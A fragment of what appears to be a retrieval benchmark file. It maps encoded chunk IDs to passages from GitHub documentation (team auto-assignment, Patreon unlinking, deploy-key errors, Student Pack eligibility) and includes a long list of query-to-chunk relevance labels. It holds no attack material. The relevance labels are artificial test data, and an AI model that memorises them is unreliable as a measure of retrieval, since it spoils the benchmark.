requests**.\n1. Optionally, to remove the review request from the team when assigning team members, s", "Y2h1bmtfMl9pbmRleF8xNjEw": "elect **Team review request**.\n1. Click **Save changes**.\n\n\n\nDisabling auto assignment\n\n{% data reusables.profile.access_org %}\n{% data reusables.user-settings.access_org %}\n{% data reusables.organizations.specific_team %}\n{% data reusables.organizations.team_settings %}\n1. Deselect **Enable auto assignment**.\n1. Click **Save changes**.\n\n", "Y2h1bmtfMF9pbmRleF8yMDk4": "---\ntitle: Unlinking your Patreon account from your GitHub Sponsors profile\nintro: 'You can disconnect your Patreon account from your {% data variables.product.prodname_sponsors %} profile to stop receiving new sponsorships through Patreon.'\nversions:\n  fpt: '*'\n  ghec: '*'\ntype: how_to\ntopics:\n  - Open Source\n  - Sponsors payments\nshortTitle: Unlink Patreon\n---\n\n{% note %}\n\n**Note:** Unlinking your Patreon account from your {% data variables.product.prodname_sponsors %} profile will prevent new sponsors from sponsoring you through Patreon, but it **will not** cancel existing sponsorships through Patreon. Instead, your sponsors will have to cancel those sponsorships themselves. For more information, see How do I cancel? in the Patreon documentation.\n\n{% endnote %}\n\n{% data reusables.sponsors.unlink-patreon-account %}\n\n", "Y2h1bmtfMF9pbmRleF82Mzk=": "---\ntitle: 'Error: Permission to user/repo denied to user/other-repo'\nintro: 'This error means the key you are pushing with is attached to another repository as a deploy key, and does not have access to the repository you are trying to push to.'\nredirect_from:\n  - /articles/error-permission-to-user-repo-denied-to-user-other-repo\n  - /articles/error-permission-to-userrepo-denied-to-userother-repo\n  - /github/authenticating-to-github/error-permission-to-userrepo-denied-to-userother-repo\n  - /github/authenticating-to-github/troubleshooting-ssh/error-permission-to-userrepo-denied-to-userother-repo\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\ntopics:\n  - SSH\nshortTitle: Permission denied other-repo\n---\nTo fix this, remove the deploy key from the repository, and add the key to your personal account instead.\n\nIf the key you are using is intended to be a deploy key, check out our guide on deploy keys for more details.\n\n", "Y2h1bmtfMF9pbmRleF8xODU3": "\n\nAbout {% data variables.product.prodname_codespaces %} machines\n\nYou can determine which machine types are available to create a codespace, either on a given repository or as an authenticated user. For more information, see \"AUTOTITLE.\"\n\nYou can also use this information when changing the machine of an existing codespace by updating its `machine` property. The machine update will take place the next time the codespace is restarted. For more information, see \"AUTOTITLE.\"\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xMjA5": "\n\nUnclear academic affiliation documents\n\nIf the dates or schedule mentioned in your uploaded image do not match our eligibility criteria, we require further proof of your academic status.\n\nIf the image you uploaded doesn't clearly identify your current academic status or if the uploaded image is blurry, we require further proof of your academic status. {% data reusables.education.upload-proof-reapply %}\n\n{% data reusables.education.pdf-support %}\n\n\n\nUsing an academic email with an unverified domain\n\nIf your academic email address has an unverified domain, we require further proof of your academic status. {% data reusables.education.upload-proof-reapply %}\n\n{% data reusables.education.pdf-support %}\n\n\n\nUsing an academic email from a school with lax email policies\n\nIf your school issues email addresses prior to paid student enrollment, we require further proof of your academic status. {% data reusables.education.upload-proof-reapply %}\n\n{% data reusables.education.pdf-support %}\n\nIf you have other questions or concerns about the school domain please ask your school IT staff to contact us.\n\n\n\nAcademic email address already used\n\nIf your academic email address was already used to request a {% data variables.product.prodname_student_pack %} for a different {% data variables.product.prodname_dotcom %} account, you cannot reuse the academic email address to successfully apply for another {% data variables.product.prodname_student_pack %}.\n\n{% note %}\n\n**Note:** It is against the {% data variables.product.prodname_dotcom %} Terms of Service to maintain more than one individual account.\n\n{% endnote %}\n\nIf you have more than one personal account, you must merge your accounts. To retain the discount, keep the account that was granted the discount. You can rename the retained account and keep your contribution history by adding all your email addresses to the retained account.\n\nFor more information, see:\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n\n\nIneligible student status\n\nYou're ineligible for a {% data variables.product", "Y2h1bmtfMV9pbmRleF8xMjA5": ".prodname_student_pack %} if:\n- You're enrolled in an informal learning program that is not part of the {% data variables.product.prodname_campus_program %} and not enrolled in a degree or diploma granting course of study.\n- You're pursuing a degree which will be terminated in the current academic session.\n- You're under 13 years old.\n\nYour instructor may still apply for a {% data variables.product.prodname_education %} discount for classroom use. If you're a student at a coding school or bootcamp, you will become eligible for a {% data variables.product.prodname_student_pack %} if your school joins the {% data variables.product.prodname_campus_program %}.\n\n\n\nFurther reading\n\n- \"How to get the GitHub Student Developer Pack without a student ID\" on {% data variables.product.prodname_blog %}\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xOTMw": "\n\nAbout repository traffic\n\nYou can use these endpoints to retrieve information provided in your repository graph, for repositories that you have write access to. For more information, see \"AUTOTITLE\".\n\n\n\n"}, "relevant_docs": {"1fe7bf87-2e95-4326-8b1d-699ccf3f64b3": ["Y2h1bmtfMF9pbmRleF8xMzE="], "0050bcc8-48f8-4d7a-a221-484a789c8e3e": ["Y2h1bmtfMV9pbmRleF8xMzE="], "4ff76173-e713-4c01-be1a-1096103c8477": ["Y2h1bmtfMV9pbmRleF8xMzE="], "e673374c-c942-4130-b70c-a4d17569a8d4": ["Y2h1bmtfMl9pbmRleF8xMzE="], "0ff35c1c-dbbd-4439-975d-714081d174f5": ["Y2h1bmtfMF9pbmRleF8xMzI="], "ec06617a-9f78-45dc-935e-8c0bf5c73045": ["Y2h1bmtfMF9pbmRleF8xMzI="], "d9f97bf6-2a80-4a6a-9f42-7c1a0061f014": ["Y2h1bmtfMF9pbmRleF8xMzI="], "e992b2af-bcac-409a-b2bc-297896aa1a8f": ["Y2h1bmtfMV9pbmRleF8xMzI="], "ffbd25b6-c09a-4b52-ad0a-7dc06cea5f5e": ["Y2h1bmtfMl9pbmRleF8xMzI="], "030036af-d8df-4710-b908-d2dcb85b0c9e": ["Y2h1bmtfMl9pbmRleF8xMzI="], "f7dc3913-2dd6-4e3f-b8ae-b6b02905782d": ["Y2h1bmtfM19pbmRleF8xMzI="], "69f9b7b2-4c33-4a98-818e-ddad04c9f49d": ["Y2h1bmtfM19pbmRleF8xMzI="], "21cbb304-fd14-499e-a702-132acee40abe": ["Y2h1bmtfNF9pbmRleF8xMzI="], "3dec850b-3b38-4257-9a05-523d59e47c9e": ["Y2h1bmtfNV9pbmRleF8xMzI="], "7b5286ae-685c-424a-bc94-4f74432c5420": ["Y2h1bmtfNl9pbmRleF8xMzI="], "d00fe010-a844-4139-a0e7-7d14ee2d384b": ["Y2h1bmtfMF9pbmRleF8xMzM="], "f735a460-f8ae-4106-a647-981d1975c7eb": ["Y2h1bmtfMF9pbmRleF8xMzM="], "0c302e11-f10e-404d-b44c-1319b3d19566": ["Y2h1bmtfMV9pbmRleF8xMzM="], "b1423d14-d780-4dd0-983d-e72ee37abd9d": ["Y2h1bmtfMV9pbmRleF8xMzM="], "a5e19994-5e1d-4ef8-add3-57ac605651f2": ["Y2h1bmtfMl9pbmRleF8xMzM="], "e9365461-4730-49b1-87c5-7a765c99091c": ["Y2h1bmtfMl9pbmRleF8xMzM="], "ea0d55d7-1ec2-4928-ae03-d73047d1d845": ["Y2h1bmtfMl9pbmRleF8xMzM="], "a4f35daa-dd56-481a-a131-8351ffa8cc93": ["Y2h1bmtfMl9pbmRleF8xMzM="], "4cc4d1f1-57bc-4aba-9080-f75d92d662de": ["Y2h1bmtfMl9pbmRleF8xMzM="], "8d46f348-9b99-410c-8645-068e57d00676": ["Y2h1bmtfMl9pbmRleF8xMzM="], "ec755967-62b2-48c8-93fb-2b4dcedc52ab": ["Y2h1bmtfMl9pbmRleF8xMzM="], "139498e1-53a5-4072-897c-583f5dbfca37": ["Y2h1bmtfMl9pbmRleF8xMzM="], "a716a2b0-2115-4f3e-842d-00debe64d020": ["Y2h1bmtfM19pbmRleF8xMzM="], "e6fb8f16-21a2-4747-bc11-89b11d48e06c": ["Y2h1bmtfM19pbmRleF8xMzM="], "5ddb1d00-4af5-4d14-b70f-c9a99d43712a": ["Y2h1bmtfNF9pbmRleF8xMzM="], "043c33f8-5291-427f-9bb2-3bc470936348": ["Y2h1bmtfNF9pbmRleF8xMzM="], "49abc701-6557-42c0-9057-9dd8aef5de23": ["Y2h1bmtfMF9pbmRleF8xMzQ="], "4a33e44a-d75a-4246-a609-74954ef1a4a7": ["Y2h1bmtfMF9pbmRleF8xMzQ="], "e5cf6919-fe04-4f4f-8609-7937e800ec66": ["Y2h1bmtfMV9pbmRleF8xMzQ="], "ae9081f0-e775-4f7d-b381-42a903a38fea": ["Y2h1bmtfMl9pbmRleF8xMzQ="], "378a66fa-60c5-4828-9a08-7ef82774a5a2": ["Y2h1bmtfMl9pbmRleF8xMzQ="], "cc75b494-11e4-486c-97e4-dc33f72ebe4f": ["Y2h1bmtfMF9pbmRleF8xMzU="], "092a655c-fe82-4bcf-be7e-11235af04a17": ["Y2h1bmtfMF9pbmRleF8xMzU="], "860c890a-e358-48e9-994b-c75ac3e7eb83": ["Y2h1bmtfMV9pbmRleF8xMzU="], "ed837a1d-67fb-4b23-84a8-8bdad10b2a56": ["Y2h1bmtfMV9pbmRleF8xMzU="], "e5914c9b-0878-480c-917b-4f76272a4f2c": ["Y2h1bmtfMl9pbmRleF8xMzU="], "ec885cc6-4f2d-43ff-9f17-b45076525ffb": ["Y2h1bmtfMl9pbmRleF8xMzU="], "9d14dd42-8a63-4a91-80bb-eae2f7c080bc": ["Y2h1bmtfMF9pbmRleF8xMzY="], "606ec638-4e09-478d-ba32-d0e8b0b30e0e": ["Y2h1bmtfMF9pbmRleF8xMzY="], "131d1d78-03b1-4138-84d6-c555b0055ca1": ["Y2h1bmtfMV9pbmRleF8xMzY="], "edff6db7-f908-4005-913f-b4acfd9e87d1": ["Y2h1bmtfMV9pbmRleF8xMzY="], "4629a2d4-fda9-4e25-929b-1fa5c1226244": ["Y2h1bmtfMF9pbmRleF8xMzc="], "eb3c9343-c0a8-4d13-8a83-14ea17122c08": ["Y2h1bmtfMF9pbmRleF8xMzc="], "8bfa4f59-95b4-4d31-a270-27162ebbcf2b": ["Y2h1bmtfMV9pbmRleF8xMzc="], "a210fbb0-7184-4833-a5ee-c7f06cd8926b": ["Y2h1bmtfMl9pbmRleF8xMzc="], "c57da078-b37c-46e8-a949-504227ea394a": ["Y2h1bmtfMl9pbmRleF8xMzc="], "d3fff80b-c4c9-4a62-81c4-a90d6e8b4bf3": ["Y2h1bmtfM19pbmRleF8xMzc="], "749b365e-8df9-4e56-abfd-ddb6952f70e3": ["Y2h1bmtfM19pbmRleF8xMzc="], "80838b08-41ee-4139-b4c2-ce7e98f63956": ["Y2h1bmtfNF9pbmRleF8xMzc="], "e38e5103-3149-497e-890e-59a08e786bab": ["Y2h1bmtfNF9pbmRleF8xMzc="], "f81427cb-37e2-4ab0-8c4f-a3879f9e046e": ["Y2h1bmtfNV9pbmRleF8xMzc="], "64be7529-cad8-4652-b7a8-4f1bda3bdbd0": ["Y2h1bmtfNV9pbmRleF8xMzc="], "66cb5bd8-0347-492e-b812-a9c711ad6ae8": ["Y2h1bmtfNl9pbmRleF8xMzc="], "73bc44b4-d5d3-497b-b55d-8675b4a0d484": ["Y2h1bmtfN19pbmRleF8xMzc="], "196a3a34-d6d6-458e-bdbb-f0cdc7e55282": ["Y2h1bmtfOF9pbmRleF8xMzc="], "6c923562-1419-4300-b9fe-bc78b6742535": ["Y2h1bmtfOF9pbmRleF8xMzc="], "b05591eb-46ee-49f3-8019-d918109717a1": ["Y2h1bmtfOV9pbmRleF8xMzc="], "01124280-679c-4a14-9933-2389e96507d2": ["Y2h1bmtfOV9pbmRleF8xMzc="], "fd254fb7-52f7-46ff-961e-09fdcb8601e7": ["Y2h1bmtfMTBfaW5kZXhfMTM3"], "cdcae4f8-c6de-4e53-a58e-8bf20ad9ba60": ["Y2h1bmtfMTBfaW5kZXhfMTM3"], "a28f86c3-6b96-4397-914d-6d9dc9e5b8a6": ["Y2h1bmtfMTFfaW5kZXhfMTM3"], "7337d5d5-002e-4a43-a197-c033041ef31d": ["Y2h1bmtfMTFfaW5kZXhfMTM3"], "19fddb0f-8dd6-4fe8-aaaf-90880955818e": ["Y2h1bmtfMTJfaW5kZXhfMTM3"], "7bbe8426-6362-4260-855c-425cf20b8777": ["Y2h1bmtfMTJfaW5kZXhfMTM3"], "d3aab7eb-1e4b-49db-8f78-932d3fa95855": ["Y2h1bmtfMTNfaW5kZXhfMTM3"], "d9fc6115-96b0-49f4-882a-49af126db7e7": ["Y2h1bmtfMTNfaW5kZXhfMTM3"], "9f0e6cbb-85db-4548-ae5b-615634d102c7": ["Y2h1bmtfMTNfaW5kZXhfMTM3"], "40e20878-fd21-47fd-b298-e5775fc3084a": ["Y2h1bmtfMF9pbmRleF8xMzg="], "e14f74a9-bf00-4628-9f0f-b6af4676aa52": ["Y2h1bmtfMV9pbmRleF8xMzg="], "4c664852-e039-4f11-9733-3c01af63a02c": ["Y2h1bmtfMV9pbmRleF8xMzg="], "778f0a2f-de58-48c4-8cf1-bbc4928afd2f": ["Y2h1bmtfMF9pbmRleF8xMzk="], "78e76d83-5b7c-4e5e-b971-4ecb28bf7b4c": ["Y2h1bmtfMF9pbmRleF8xMzk="], "8056da18-6192-4c52-bf4d-2e2dd57a3ea4": ["Y2h1bmtfMV9pbmRleF8xMzk="], "624f89b1-1bb3-4c30-a5f9-4dc905fe6acf": ["Y2h1bmtfMV9pbmRleF8xMzk="], "ec386f1f-4911-4851-badc-08d025c78d4d": ["Y2h1bmtfMV9pbmRleF8xMzk="], "548e5c97-0df5-40ab-9c7c-7d2afefa762a": ["Y2h1bmtfMF9pbmRleF8xNDA="], "c0e17a7d-eeee-40ff-8eb4-9e893a8890fa": ["Y2h1bmtfMV9pbmRleF8xNDA="], "582f2f76-71f2-473b-8738-d494c02f90f2": ["Y2h1bmtfMV9pbmRleF8xNDA="], "76a51550-432c-403e-912f-5e9323a3cd1a": ["Y2h1bmtfMF9pbmRleF8xNDE="], "d874a1ee-befe-49c5-b349-df92323ec8ed": ["Y2h1bmtfMF9pbmRleF8xNDE="], "b03ba6ad-6c62-458d-bffb-ca0ed026ede5": ["Y2h1bmtfMV9pbmRleF8xNDE="], "daf85c19-0631-4d0c-bf38-32535d74199c": ["Y2h1bmtfMV9pbmRleF8xNDE="], "3319f528-72e0-4ca9-bc7d-fabb2b84dd9c": ["Y2h1bmtfMF9pbmRleF8xNDI="], "11f84c36-a220-419d-bc60-758525a572e7": ["Y2h1bmtfMV9pbmRleF8xNDI="], "0a61b9fb-0c06-4729-abe8-1b44ec4e46e6": ["Y2h1bmtfMl9pbmRleF8xNDI="], "031be1fe-c987-48ea-9b5d-517f73dbeb9f": ["Y2h1bmtfMl9pbmRleF8xNDI="], "5e595566-f2c9-4541-afed-3f2b1137d5a6": ["Y2h1bmtfMF9pbmRleF8xNDM="], "bbce6ca1-86b7-4956-99d3-1335b26c21ed": ["Y2h1bmtfMF9pbmRleF8xNDM="], "cf104d2e-c28c-4e11-a462-ead9714fb757": ["Y2h1bmtfMV9pbmRleF8xNDM="], "683d3eff-9eee-487e-884d-05ee1e441c91": ["Y2h1bmtfMV9pbmRleF8xNDM="], "56d88f1d-5773-436b-a202-09622a50acaa": ["Y2h1bmtfMl9pbmRleF8xNDM="], "79e795d5-c876-421f-be4c-a3a5200bc2b5": ["Y2h1bmtfMl9pbmRleF8xNDM="], "4d3454dc-bfd3-40ab-9f4b-b1b12304fa1f": ["Y2h1bmtfMF9pbmRleF8xNDQ="], "df08f080-cd35-4acf-9c17-d9229d8be696": ["Y2h1bmtfMF9pbmRleF8xNDU="], "d110722d-7f4a-47c4-9eed-0d2cdd82b8c6": ["Y2h1bmtfMF9pbmRleF8xNDU="], "cdd0f12a-e92a-49a2-ae6d-a6cad1edfead": ["Y2h1bmtfMF9pbmRleF8xNDY="], "33cfa256-d175-43af-a106-d1ea0caa914d": ["Y2h1bmtfMF9pbmRleF8xNDY="], "11bc083d-4249-4c50-971e-219521a1d622": ["Y2h1bmtfMF9pbmRleF8xNDc="], "9323342c-8cbf-4bdd-857e-e80b82b37a0a": ["Y2h1bmtfMF9pbmRleF8xNDc="], "42fa1ed4-8fe4-4f1e-b49f-2b7e4c3902dc": ["Y2h1bmtfMV9pbmRleF8xNDc="], "636e899d-bdc2-492d-8bfa-02e47547c457": ["Y2h1bmtfMV9pbmRleF8xNDc="], "f0d0bf19-5136-4d67-95e1-c561a37b2cda": ["Y2h1bmtfMF9pbmRleF8xNDg="], "ec083522-ddd1-43a8-b6d7-41759d66d0bc": ["Y2h1bmtfMF9pbmRleF8xNDg="], "e0dc8f48-dca9-4677-9a17-1e8680585bc9": ["Y2h1bmtfMF9pbmRleF8xNDk="], "1d43d80c-d1b3-4646-a5d2-c74225b30b55": ["Y2h1bmtfMF9pbmRleF8xNDk="], "26674501-5bfd-464d-a1b3-1fa59cafd536": ["Y2h1bmtfMV9pbmRleF8xNDk="], "bc03ecdd-4164-4cd4-a6db-9e3a083e35cc": ["Y2h1bmtfMV9pbmRleF8xNDk="], "7058e020-478e-4f6c-adf9-6f1ec7a1a9f3": ["Y2h1bmtfMF9pbmRleF8xNTA="], "6636b712-de5a-4ed6-b99b-16c09dfe77c7": ["Y2h1bmtfMF9pbmRleF8xNTA="], "6d213584-41bd-4fec-9490-0629e1ae948b": ["Y2h1bmtfMV9pbmRleF8xNTA="], "a3886a67-ec91-49a1-9227-799a32109cbf": ["Y2h1bmtfMV9pbmRleF8xNTA="], "6e37188c-3d18-4f8f-817e-08b406226252": ["Y2h1bmtfMV9pbmRleF8xNTA="], "c97c1bd0-71f8-45dd-823f-e4352d3f9f22": ["Y2h1bmtfMV9pbmRleF8xNTA="], "6143270d-9332-4a4e-9923-476d144be590": ["Y2h1bmtfMV9pbmRleF8xNTA="], "f6d7088d-ed4f-4dd1-bc3b-abfdf2e7ba86": ["Y2h1bmtfMV9pbmRleF8xNTA="], "d2fd7421-6bb4-4856-b5e3-ba08aae23b56": ["Y2h1bmtfMV9pbmRleF8xNTA="], "eb1b91a0-947f-4af5-886b-bc0379952e5f": ["Y2h1bmtfMV9pbmRleF8xNTA="], "a319b1ac-b71b-4922-8e4d-4f93925b6afa": ["Y2h1bmtfMl9pbmRleF8xNTA="], "c29c8c4f-dca7-4770-b566-32926fdf81ad": ["Y2h1bmtfMl9pbmRleF8xNTA="], "23668435-dda1-469f-b237-d78e87f00671": ["Y2h1bmtfM19pbmRleF8xNTA="], "50e576ba-9d15-4f63-a6c2-d9bae68883ea": ["Y2h1bmtfM19pbmRleF8xNTA="], "48b8da4b-e9a9-4ef0-bd35-37c47572936b": ["Y2h1bmtfM19pbmRleF8xNTA="], "10be6786-0c6d-44d9-b690-ae6e63afcb82": ["Y2h1bmtfMF9pbmRleF8xNTE="], "cb3a8963-d43c-46a6-a741-8288d7d4205f": ["Y2h1bmtfMF9pbmRleF8xNTE="], "23df0853-5f80-49ca-ae1e-ee70d0722b23": ["Y2h1bmtfMF9pbmRleF8xNTE="], "763f038f-b442-4861-95a6-e210da05a12a": ["Y2h1bmtfMF9pbmRleF8xNTI="], "d72c5507-2e55-47a7-9bc5-5fe413f4f928": ["Y2h1bmtfMF9pbmRleF8xNTI="], "381eb52d-650b-4c0d-93d1-e0dc0315cfe3": ["Y2h1bmtfMV9pbmRleF8xNTI="], "6ccc7980-1da7-429d-9a8b-2255a17567ae": ["Y2h1bmtfMV9pbmRleF8xNTI="], "dc115e8d-fa86-4abe-ae3e-094226f21153": ["Y2h1bmtfMF9pbmRleF8xNTM="], "8bd76cfd-2a2d-44ea-9983-58f7b7ad9049": ["Y2h1bmtfMF9pbmRleF8xNTM="], "0eaf9c41-6d7c-42d3-9df1-64e43f2c819e": ["Y2h1bmtfMF9pbmRleF8xNTM="], "58bda7b7-54b5-42f9-a4d6-c549cc33971b": ["Y2h1bmtfMF9pbmRleF8xNTM="], "4004806f-6880-49e6-8c3c-4fb82459b6eb": ["Y2h1bmtfMF9pbmRleF8xNTM="], "b3459a72-3116-4b89-8d01-47cbb99119b7": ["Y2h1bmtfMF9pbmRleF8xNTM="], "ffa9154b-462a-42ff-a9ea-cbaf16e39b5d": ["Y2h1bmtfMF9pbmRleF8xNTM="], "1b53cb3f-7c93-4e3a-bd87-ba0830a62efa": ["Y2h1bmtfMF9pbmRleF8xNTM="], "17c7c163-c61d-436e-9abd-bea0815ed387": ["Y2h1bmtfMF9pbmRleF8xNTQ="], "93e2d391-afbb-4f85-a34a-fc88b9f64a45": ["Y2h1bmtfMF9pbmRleF8xNTQ="], "c7c8bfce-ded6-44d8-bd11-ce3af2666746": ["Y2h1bmtfMF9pbmRleF8xNTQ="], "52c0da2e-edd8-41f1-a2b8-e857de3c2351": ["Y2h1bmtfMV9pbmRleF8xNTQ="], "ab9cfb06-9b4f-48c3-b52c-e4fa1335b697": ["Y2h1bmtfMl9pbmRleF8xNTQ="], "597aa23d-22e9-48fe-8d2f-7af9dd6713af": ["Y2h1bmtfMl9pbmRleF8xNTQ="], "96b99fc8-6c6e-4d0b-8ba3-8a58c9ae0937": ["Y2h1bmtfM19pbmRleF8xNTQ="], "5387975f-7f5f-4cd5-84da-0441a28c51bd": ["Y2h1bmtfM19pbmRleF8xNTQ="], "15c80d78-04fc-4d29-97d6-6a7c4bc20b33": ["Y2h1bmtfMF9pbmRleF8xNTU="], "f8f32033-b188-4e79-8785-990755beaa88": ["Y2h1bmtfMF9pbmRleF8xNTU="], "0adb4797-3a13-4b53-9c11-636f51af9de0": ["Y2h1bmtfMV9pbmRleF8xNTU="], "43cf846d-c171-4bfa-bc60-eccba2fb11c7": ["Y2h1bmtfMV9pbmRleF8xNTU="], "ddf95c98-829c-4602-8743-d2100568e436": ["Y2h1bmtfMl9pbmRleF8xNTU="], "0d76c231-3bf2-4304-a4f8-69642c9a2636": ["Y2h1bmtfM19pbmRleF8xNTU="], "d4718577-0f15-4eef-91ce-b6623c312d92": ["Y2h1bmtfNF9pbmRleF8xNTU="], "25746335-1f8b-4681-adb9-fe6637154240": ["Y2h1bmtfMF9pbmRleF8xNTY="], "d0b12b4e-f1aa-44c5-9870-a514b1a96cc0": ["Y2h1bmtfMF9pbmRleF8xNTY="], "114bcccd-cb03-4fbe-9b44-782fce1ad607": ["Y2h1bmtfMV9pbmRleF8xNTY="], "ca3ced32-5b9f-4208-b2cf-8cff626f01d9": ["Y2h1bmtfMV9pbmRleF8xNTY="], "7f4eb4fc-1c3d-49a3-84ed-19a5233496e1": ["Y2h1bmtfMl9pbmRleF8xNTY="], "be4f92bc-11ac-4186-9a39-5414ba31dcfa": ["Y2h1bmtfM19pbmRleF8xNTY="], "19814cc3-e85b-49d5-bbaa-c6217a376548": ["Y2h1bmtfM19pbmRleF8xNTY="], "9f6cc269-9d7c-450f-baf4-53ebaae68cf7": ["Y2h1bmtfNF9pbmRleF8xNTY="], "c43fc4a7-ab6f-4dd8-96ec-9e329ee133f2": ["Y2h1bmtfNF9pbmRleF8xNTY="], "1d6ecf08-f388-4564-b423-05e2613344bb": ["Y2h1bmtfNV9pbmRleF8xNTY="], "0d149273-97cd-465e-998e-49f9431f8b8b": ["Y2h1bmtfNl9pbmRleF8xNTY="], "6a1dbef3-9698-4208-a9e0-b38bed0242ed": ["Y2h1bmtfNl9pbmRleF8xNTY="], "66233499-2c1e-4bf7-b6a1-e2e8861f6e4a": ["Y2h1bmtfN19pbmRleF8xNTY="], "ff00849a-ef77-40b9-bf75-99f38e0f2d41": ["Y2h1bmtfOF9pbmRleF8xNTY="], "5fa1ec2e-2ca3-4ae0-afb2-0ef0b40fc7f0": ["Y2h1bmtfOF9pbmRleF8xNTY="], "e8476d93-005c-47b0-aaa0-31d139c17bfd": ["Y2h1bmtfOV9pbmRleF8xNTY="], "e6760861-41c5-4e37-a44d-fff96f3d93e6": ["Y2h1bmtfOV9pbmRleF8xNTY="], "b33c16c2-610e-4337-9b5b-8d4745e26a8c": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "9717a7a7-f753-4653-b467-10acca716c76": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "5a5d622d-942e-4954-a901-4e410c6f0106": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "22fc4521-a52a-42bf-8b8e-b7c90e9c12a2": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "5e319927-ff5e-4c99-9333-4c5301844681": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "5044268b-ac81-44ed-9a6e-6f4bab09c2bb": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "60ed9b1e-8c0d-4685-8978-1595f8c88dc6": ["Y2h1bmtfMTBfaW5kZXhfMTU2"], "3a747e57-abd0-46a9-a20b-ca14407aa83b": ["Y2h1bmtfMTFfaW5kZXhfMTU2"], "fb1169a7-7e7f-422d-820c-45462fd57d7f": ["Y2h1bmtfMTFfaW5kZXhfMTU2"], "3bdc2fc9-da12-4259-a188-3e36441835e0": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "8ad83c97-d5f9-4bbd-85e7-da00407d9a86": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "4a6b12d5-55da-4d8d-ae1b-89c93afac239": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "d381e3ae-6b5f-4300-b4c8-415d696b5f0b": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "e2613f30-1af8-4acf-9aee-2f78a80fc05b": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "ab7e84e4-c399-4646-b4fd-e0e4aa44672d": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "b1db8e4c-4cd0-4c8a-9c27-b6950da63154": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "0b4e188d-51f8-4e2a-b273-e1c767226e0d": ["Y2h1bmtfMTJfaW5kZXhfMTU2"], "8c0228ae-68a7-4792-bf19-00d3822c415b": ["Y2h1bmtfMTNfaW5kZXhfMTU2"], "bbd85715-b85b-457f-bac7-aac7e981cc4a": ["Y2h1bmtfMTNfaW5kZXhfMTU2"], "0f0201f7-e46e-4632-8f6b-c93d294e3082": ["Y2h1bmtfMTRfaW5kZXhfMTU2"], "d5404928-1103-451f-97b9-c3793545d918": ["Y2h1bmtfMTRfaW5kZXhfMTU2"], "001cbf42-24c7-4bbc-bf2b-d5d2bbd5b409": ["Y2h1bmtfMTVfaW5kZXhfMTU2"], "c03935db-6eb8-4476-95a0-c8b746240211": ["Y2h1bmtfMTZfaW5kZXhfMTU2"], "1a3faf55-1b48-4be3-b060-aa7af2c1e3b6": ["Y2h1bmtfMTZfaW5kZXhfMTU2"], "cd7a316a-3d24-4070-b398-961788134542": ["Y2h1bmtfMF9pbmRleF8xNTc="], "b64115e6-d5a7-4cbb-b08c-fffbe4812f2f": ["Y2h1bmtfMF9pbmRleF8xNTc="], "fb7752c7-ac8c-442c-9234-f290f60f8757": ["Y2h1bmtfMV9pbmRleF8xNTc="], "2f052ca1-663a-4749-be02-25f00d542d48": ["Y2h1bmtfMV9pbmRleF8xNTc="], "43982711-bf0f-43f0-97bb-9ac136522812": ["Y2h1bmtfMl9pbmRleF8xNTc="], "7f039545-301f-4a12-a079-5db4c92b0a0e": ["Y2h1bmtfMl9pbmRleF8xNTc="], "e2fde3a1-e129-40ab-98e3-fa6605c24a06": ["Y2h1bmtfMl9pbmRleF8xNTc="], "e7b9aa5e-c461-419d-b7c0-97694e846739": ["Y2h1bmtfM19pbmRleF8xNTc="], "44fc0900-4abf-4a72-8339-b487ac2a1066": ["Y2h1bmtfM19pbmRleF8xNTc="], "2cadecc4-e235-4f53-9c09-c116da41aabc": ["Y2h1bmtfM19pbmRleF8xNTc="], "eb071634-d683-4f02-a496-5dce94ed01b7": ["Y2h1bmtfM19pbmRleF8xNTc="], "54982b43-a508-4c62-811c-bbe089c258b2": ["Y2h1bmtfM19pbmRleF8xNTc="], "085f6389-cf44-4db6-8f71-85568daae9e4": ["Y2h1bmtfNF9pbmRleF8xNTc="], "508d5869-70e4-412a-810f-968634b6092a": ["Y2h1bmtfNV9pbmRleF8xNTc="], "729b3c2b-a379-4a95-aad2-cc42554438ab": ["Y2h1bmtfNl9pbmRleF8xNTc="], "450c9347-7398-4ed6-a457-5a488f3378a3": ["Y2h1bmtfNl9pbmRleF8xNTc="], "11c87bc6-c136-4466-8158-a71f94940164": ["Y2h1bmtfNl9pbmRleF8xNTc="], "d97ebf7e-6133-41b9-b7c8-cc7235a7c44b": ["Y2h1bmtfNl9pbmRleF8xNTc="], "e5ee7725-1f43-49ee-892f-8fca6257c8af": ["Y2h1bmtfN19pbmRleF8xNTc="], "6917b0aa-41be-4000-8b32-b715ffd7ac45": ["Y2h1bmtfN19pbmRleF8xNTc="], "68c39ce5-a8d1-4767-b79d-b4c28ac39059": ["Y2h1bmtfOF9pbmRleF8xNTc="], "e46266e2-8520-4b85-b70f-411d9f36c1ac": ["Y2h1bmtfOV9pbmRleF8xNTc="], "fe4d4cf3-46ea-451d-b03f-36d83eee40b2": ["Y2h1bmtfMTBfaW5kZXhfMTU3"], "9800de73-4c18-4f4b-88da-a169d73f3277": ["Y2h1bmtfMTBfaW5kZXhfMTU3"], "beffc6c5-baeb-466e-857d-a7644e048572": ["Y2h1bmtfMTFfaW5kZXhfMTU3"], "d21559b1-01b0-4db2-a4c2-909b0a60f86c": ["Y2h1bmtfMTFfaW5kZXhfMTU3"], "305f20ce-4117-4188-9b42-a6b343a8a9d8": ["Y2h1bmtfMF9pbmRleF8xNTg="], "c69cdccf-9863-46da-a17b-69ed0f68a50d": ["Y2h1bmtfMF9pbmRleF8xNTg="], "bf8cee0f-bc6a-40fc-930a-19a16e956bb3": ["Y2h1bmtfMV9pbmRleF8xNTg="], "8d0a7084-c166-4941-8805-e3e011c597ee": 